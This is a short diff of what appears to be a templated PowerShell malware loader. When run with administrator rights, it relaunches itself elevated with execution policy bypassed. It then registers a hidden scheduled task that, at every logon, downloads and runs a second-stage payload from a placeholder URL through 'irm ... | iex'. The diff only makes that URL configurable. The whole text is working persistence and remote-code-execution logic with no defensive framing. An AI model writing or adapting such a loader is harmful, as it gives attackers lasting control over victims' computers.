@@ -40,7 +40,7 @@ IF (#tryUAC) THEN
     if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
         Start-Process powershell -Verb runas -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"
         Register-ScheduledTask -Force -TaskName 'taskname'
-            -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -NoProfile -Command `"irm stage2_url | iex`"') `
+            -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -NoProfile -Command `"irm #stage2_url | iex`"') `
             -Settings (New-ScheduledTaskSettingsSet -Hidden -DontStopIfGoingOnBatteries -AllowStartIfOnBatteries) `
             -Trigger (New-ScheduledTaskTrigger -AtLogon)
         `""
